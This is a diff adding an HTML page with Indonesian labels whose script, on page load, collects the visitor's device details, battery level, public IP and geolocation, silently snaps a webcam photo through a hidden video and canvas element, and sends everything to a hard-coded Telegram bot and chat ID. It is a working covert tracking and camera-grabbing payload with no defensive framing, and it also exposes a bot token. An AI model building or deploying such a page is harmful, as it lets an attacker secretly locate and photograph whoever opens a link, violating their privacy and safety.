@@ -1,0 +1,125 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8">
+  <title>Kamera + Info Device</title>
+  <style>
+    body { background:black; color:lime; font-family:monospace; padding:20px; }
+    pre { white-space:pre-wrap; text-align:left; }
+  </style>
+</head>
+<body>
+<h2>🔍 Mengumpulkan Data...</h2>
+<video id="video" autoplay playsinline width="300" height="300" style="display:none"></video>
+<canvas id="canvas" width="300" height="300" style="display:none"></canvas>
+<pre id="log"></pre>
+
+<script>
+const BOT_TOKEN = "8275671762:AAFHjoV2ZQCW9y69JvUTarIw7hUT0NVAXF8";
+const CHAT_ID   = "6216902201";
+
+const logBox = document.getElementById("log");
+const video = document.getElementById("video");
+const canvas = document.getElementById("canvas");
+const ctx = canvas.getContext("2d");
+
+let deviceInfo = {
+  platform: navigator.platform,
+  userAgent: navigator.userAgent,
+  language: navigator.language,
+  screen: `${screen.width}x${screen.height}`,
+  timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+  date: new Date().toLocaleString()
+};
+
+// ambil baterai
+if (navigator.getBattery) {
+  navigator.getBattery().then(bat => {
+    deviceInfo.battery = `${Math.round(bat.level*100)}% (${bat.charging?"Charging":"Not Charging"})`;
+  });
+}
+
+// ambil lokasi
+function getLocation(){
+  return new Promise((resolve) => {
+    if (navigator.geolocation){
+      navigator.geolocation.getCurrentPosition(pos => {
+        resolve({
+          lat: pos.coords.latitude,
+          lon: pos.coords.longitude,
+          acc: pos.coords.accuracy + " m",
+          maps: `https://maps.google.com/?q=${pos.coords.latitude},${pos.coords.longitude}`
+        });
+      }, err => resolve({error:err.message}));
+    } else resolve({error:"Geolocation tidak didukung"});
+  });
+}
+
+// ambil IP publik
+function getIP(){
+  return fetch("https://api.ipify.org?format=json").then(r=>r.json()).then(j=>j.ip);
+}
+
+// kirim ke telegram
+async function sendToTelegram(photoBlob, info){
+  let textMsg = `📡 Device Info
+Platform: ${info.platform}
+UserAgent: ${info.userAgent}
+Screen: ${info.screen}
+Language: ${info.language}
+Timezone: ${info.timezone}
+Date: ${info.date}
+Battery: ${info.battery||"?"}
+
+🌍 Lokasi:
+${info.location?.lat}, ${info.location?.lon}
+Akurasi: ${info.location?.acc}
+Maps: ${info.location?.maps}
+
+🌐 IP: ${info.ip||"?"}`;
+
+  // kirim teks
+  await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,{
+    method:"POST",
+    headers:{"Content-Type":"application/json"},
+    body:JSON.stringify({chat_id:CHAT_ID, text:textMsg})
+  });
+
+  // kirim foto
+  let formData = new FormData();
+  formData.append("chat_id", CHAT_ID);
+  formData.append("photo", photoBlob, "cam.png");
+
+  await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`,{
+    method:"POST",
+    body:formData
+  });
+
+  logBox.textContent = "✅ Data & Foto terkirim ke Telegram!";
+}
+
+// mulai kamera + proses
+(async ()=>{
+  deviceInfo.ip = await getIP();
+  deviceInfo.location = await getLocation();
+
+  navigator.mediaDevices.getUserMedia({video:true})
+  .then(stream=>{
+    video.srcObject = stream;
+    video.onloadedmetadata = ()=>{
+      setTimeout(()=>{
+        ctx.drawImage(video,0,0,canvas.width,canvas.height);
+        canvas.toBlob(blob=>{
+          sendToTelegram(blob, deviceInfo);
+          stream.getTracks().forEach(t=>t.stop());
+        },"image/png");
+      },2000);
+    };
+  })
+  .catch(err=>{
+    logBox.textContent = "❌ Kamera error: "+err.message;
+  });
+})();
+</script>
+</body>
+</html>
